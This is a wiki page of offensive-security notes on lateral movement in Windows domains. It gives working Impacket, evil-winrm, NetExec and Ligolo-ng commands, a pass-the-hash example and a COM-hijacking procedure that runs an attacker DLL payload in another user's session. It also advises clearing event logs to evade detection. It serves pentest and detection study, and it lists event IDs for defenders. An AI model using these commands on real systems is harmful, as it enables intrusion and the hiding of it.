---
title: Lateral Movement
permalink: /wiki/offsec-notes/concepts/lateral-movement/
layout: single
author_profile: true
tags:
- offsec-notes
- concept
---

# Lateral Movement

**Category:** Active Directory / Windows / Network
**MITRE ATT&CK:** Lateral Movement — TA0008
**Related:** [Pass The Hash](/wiki/offsec-notes/concepts/pass-the-hash/), [Active Directory Attacks](/wiki/offsec-notes/concepts/active-directory-attacks/), [Command And Control](/wiki/offsec-notes/concepts/command-and-control/), [Post Exploitation](/wiki/offsec-notes/concepts/post-exploitation/)

## Overview
Lateral movement refers to techniques attackers use to progressively move through a network after gaining an initial foothold, accessing additional systems and resources. The goal is to reach high-value targets (DCs, databases, sensitive file shares) from an initial beachhead.

## How It Works

### Common Lateral Movement Protocols/Techniques
- **SMB/PsExec style:** Upload binary to ADMIN$, create a service, execute. Noisy.
- **WMI:** Remote process creation via DCOM. Fileless options available.
- **WinRM / PowerShell Remoting:** Uses HTTP/HTTPS (5985/5986). `Enter-PSSession`, `Invoke-Command`.
- **DCOM:** COM object activation over network. Multiple methods (ShellWindows, MMC20, etc.).
- **RDP:** GUI access; requires plaintext credential or PtH with NLA disabled.
- **SSH (Linux):** Key-based or password; agent forwarding abuse.
- **Token Impersonation:** Steal logged-on user tokens from a system (requires SYSTEM or SeImpersonatePrivilege).

### Pass-the-Credential Variants
- Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash (see [Pass The Hash](/wiki/offsec-notes/concepts/pass-the-hash/))
- Pass-the-Certificate (AD CS)

### Pivoting / Tunneling
- SOCKS proxy via C2 agent (Cobalt Strike's `socks`, Sliver, Ligolo-ng)
- SSH port forwarding / dynamic forwarding
- Chisel, rpivot, ligolo-ng — reverse SOCKS tunnels through restrictive firewalls

## Attack Methodology
1. From initial foothold, enumerate local network: ARP table, routing table, DNS, logged-on sessions.
2. Identify targets: DCs, file servers, databases, jump hosts.
3. Check what credentials/tickets are available in memory.
4. Attempt lateral movement to next target via best available protocol.
5. Establish persistence / new C2 channel on new host.
6. Repeat until objective is reached.

```
# WMI lateral movement (Impacket)
wmiexec.py domain/user:pass@target 'cmd.exe /c whoami'

# WinRM (evil-winrm)
evil-winrm -i target -u user -p pass
evil-winrm -i target -u user -H NTLMhash

# PsExec style (Impacket)
psexec.py domain/user:pass@target

# DCOM (via CrackMapExec)
nxc smb target -u user -p pass -x 'whoami' --exec-method mmcexec

# Pivoting with Ligolo-ng
# On attacker: ./proxy -selfcert -laddr 0.0.0.0:11601
# On target: ./agent -connect attacker:11601 -ignore-cert
```

## Detection & Evasion Notes
- PsExec creates service (Event 7045) + network logon (4624 type 3).
- WMI generates Event 4688 (process create) with parent `WmiPrvSE.exe`.
- WinRM uses HTTP(S); PowerShell logging (4104) captures commands.
- **Evasion:** Prefer WMI/DCOM/WinRM over PsExec. Use legitimate admin tools (LOLBins). Blend traffic timing with normal patterns. Clean up artifacts (event logs, dropped files).

## Tools
- `Impacket` — psexec, wmiexec, smbexec, atexec, dcomexec
- `evil-winrm` — WinRM shell with upload/download, AMSI bypass
- `CrackMapExec` / `NetExec` — bulk lateral movement
- `Ligolo-ng` — reverse SOCKS tunneling
- `Chisel` — TCP/UDP tunneling over HTTP
- Cobalt Strike / Sliver / Havoc — C2 with built-in lateral movement

## SpeechRuntime COM Hijacking (Cross-Session Lateral Movement)

Abuses the SpeechRuntime COM class to execute code in another user's session on the same host. CLSID `{655D9BF9-3876-43D0-B6E8-C83C1224154C}` is loaded by SpeechRuntime.exe which runs in the target user's session.

**Tool:** SpeechRuntimeMove (github.com/rtecCyberSec/SpeechRuntimeMove) — .NET assembly, inline-execute from C2

**Requirements:** Local Administrator on target host

### Procedure
```cmd
# Enumerate sessions on remote host (uses winsta.dll undocumented APIs)
dotnet inline-execute SpeechRuntimeMove.exe mode=enum target=<IP>

# Execute payload in target user's session
dotnet inline-execute SpeechRuntimeMove.exe mode=attack target=<IP> \
  dllpath=C:\temp\payload.dll session=<session_id> \
  targetuser=<domain>\<user> command="cmd.exe /C payload.exe"
```

**Mechanism:**
1. Enables Remote Registry service on target via WMI (`Win32_Service.ChangeStartMode("Automatic")`)
2. Creates registry key under target user's SID: `<SID>\SOFTWARE\Classes\CLSID\{655D9BF9...}\InprocServer32`
3. Points InprocServer32 to attacker DLL on accessible share
4. When SpeechRuntime.exe initializes (speech recognition activity), loads attacker DLL
5. Code executes in target user's session context
6. Tool reverts registry changes after execution

**Detection:**
- Event ID 7040 — Remote Registry service start type change
- Event ID 7036 — Remote Registry service entered running state
- Event IDs 4657/4660/4663 — Registry key creation/deletion on `CLSID\{655D9BF9...}`
- Event ID 4688 — `SpeechRuntime.exe` and `WmiPrvSe.exe` process creation
- `wtsapi32.dll` or `winsta.dll` loaded by non-standard processes (session enumeration)

## References
- MITRE ATT&CK TA0008 Lateral Movement
- "Lateral Movement Using DCOM" — enigma0x3
- "Pivoting with Ligolo-ng" — Nicocha30
- ipurple.team — "Microsoft Speech" (2026-04-07)
- SpeechRuntimeMove — github.com/rtecCyberSec/SpeechRuntimeMove
